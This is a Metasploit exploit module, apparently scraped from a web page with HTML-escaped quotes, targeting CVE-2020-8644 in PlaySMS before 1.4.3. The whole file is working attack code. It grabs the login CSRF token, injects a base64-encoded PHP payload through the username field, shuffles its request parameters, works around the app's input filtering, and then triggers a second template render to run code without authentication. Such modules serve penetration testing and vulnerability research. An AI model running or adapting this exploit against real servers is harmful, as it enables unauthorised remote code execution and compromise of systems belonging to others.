# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        &#039;Name&#039; => &#039;PlaySMS index.php Unauthenticated Template Injection Code Execution&#039;,
        &#039;Description&#039; => %q{
          in PlaySMS before version 1.4.3. This issue is caused by double processing a server-side template with a custom
          PHP template system called &#039;TPL&#039; which is used in the PlaySMS template engine at
          `src/Playsms/Tpl.php:_compile()`. The vulnerability is triggered when an attacker supplied username with a
          malicious payload is submitted. This malicious payload is then stored in a TPL template which when rendered a
          second time, results in code execution.
          The TPL(https://github.com/antonraharja/tpl) template language is vulnerable to PHP code injection.

          This module was tested against PlaySMS 1.4 on HackTheBox&#039;s Forlic Machine.
        },
        &#039;Author&#039; =>
            [
              &#039;Touhid M.Shaikh <touhidshaikh22[at]gmail.com>&#039;, # Metasploit Module
              &#039;Lucas Rosevear&#039; # Found and Initial PoC by NCC Group
            ],
        &#039;License&#039; => MSF_LICENSE,
        &#039;References&#039; =>
            [
              [&#039;CVE&#039;, &#039;2020-8644&#039;],
              [&#039;URL&#039;, &#039;https://www.youtube.com/watch?v=zu-bwoAtTrc&#039;],
            ],
        &#039;DefaultOptions&#039; =>
            {
              &#039;SSL&#039; => false,
              &#039;ENCODER&#039; => &#039;php/base64&#039;
            },
        &#039;Privileged&#039; => false,
        &#039;Platform&#039; => [&#039;php&#039;],
        &#039;Arch&#039; => ARCH_PHP,
        &#039;Targets&#039; =>
            [
              [ &#039;PlaySMS Before 1.4.3&#039;, {} ],
            ],
        &#039;DefaultTarget&#039; => 0,
        &#039;DisclosureDate&#039; => &#039;2020-02-05&#039;
      )
      )

    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [ true, &#039;Base playsms directory path&#039;, &#039;/&#039;]),
      ]
    )
  end

  def uri
    return target_uri.path
  end

  def check
    begin
      res = send_request_cgi({
        &#039;method&#039; => &#039;GET&#039;,
        &#039;uri&#039; => normalize_uri(uri, &#039;index.php&#039;)
      })
    rescue StandardError
      vprint_error(&#039;Unable to access the index.php file&#039;)
      return CheckCode::Unknown
    end

    if res.code == 302 && res.headers[&#039;Location&#039;].include?(&#039;index.php?app=main&inc=core_auth&route=login&#039;)
      return Exploit::CheckCode::Appears
    end

    return CheckCode::Safe
  end

  # Send Payload in Login Request
  def login
    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(uri, &#039;index.php&#039;),
      &#039;method&#039; => &#039;GET&#039;,
      &#039;vars_get&#039; => {
        &#039;app&#039; => &#039;main&#039;,
        &#039;inc&#039; => &#039;core_auth&#039;,
        &#039;route&#039; => &#039;login&#039;
      }
    })

    # Grabbing CSRF token from body
    /name="X-CSRF-Token" value="(?<csrf>[a-z0-9"]+)">/ =~ res.body
    fail_with(Failure::UnexpectedReply, "#{peer} - Could not determine the CSRF token") if csrf.nil?
    vprint_good("X-CSRF-Token for login : #{csrf}")

    cookies = res.get_cookies

    vprint_status(&#039;Trying to send the payload in the username field...&#039;)

    # Encoded in base64 to avoid HTML TAGS which are filter by the Application which is also blocking semicolon(;), that is why we&#039;re using delete_suffix(&#039;;&#039;)
    evil = "{{#{payload.encoded.delete_suffix(&#039;;&#039;)}}}"

    # Send Payload with cookies.
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(uri, &#039;index.php&#039;),
      &#039;cookie&#039; => cookies,
      &#039;vars_get&#039; => Hash[{
        &#039;app&#039; => &#039;main&#039;,
        &#039;inc&#039; => &#039;core_auth&#039;,
        &#039;route&#039; => &#039;login&#039;,
        &#039;op&#039; => &#039;login&#039;
      }.to_a.shuffle],
      &#039;vars_post&#039; => Hash[{
        &#039;X-CSRF-Token&#039; => csrf,
        &#039;username&#039; => evil,
        &#039;password&#039; => &#039;&#039;
      }.to_a.shuffle]
    })

    fail_with(Failure::UnexpectedReply, "#{peer} - Did not respond to Login request") if res.nil?

    # Request Status Check
    if res.code == 302
      print_good(&#039;Payload successfully sent&#039;)
      return cookies
    else
      fail_with(Failure::UnexpectedReply, "#{peer} - Something went wrong")
    end
  end

  def exploit
    cookies = login
    vprint_status("Cookies here : #{cookies}")
    # Execute Last Sent Username.
    send_request_cgi({
      &#039;uri&#039; => normalize_uri(uri, &#039;index.php&#039;),
      &#039;method&#039; => &#039;GET&#039;,
      &#039;cookie&#039; => cookies,
      &#039;vars_get&#039; => {
        &#039;app&#039; => &#039;main&#039;,
        &#039;inc&#039; => &#039;core_auth&#039;,
        &#039;route&#039; => &#039;login&#039;
      }
    }, 0)
  end
end

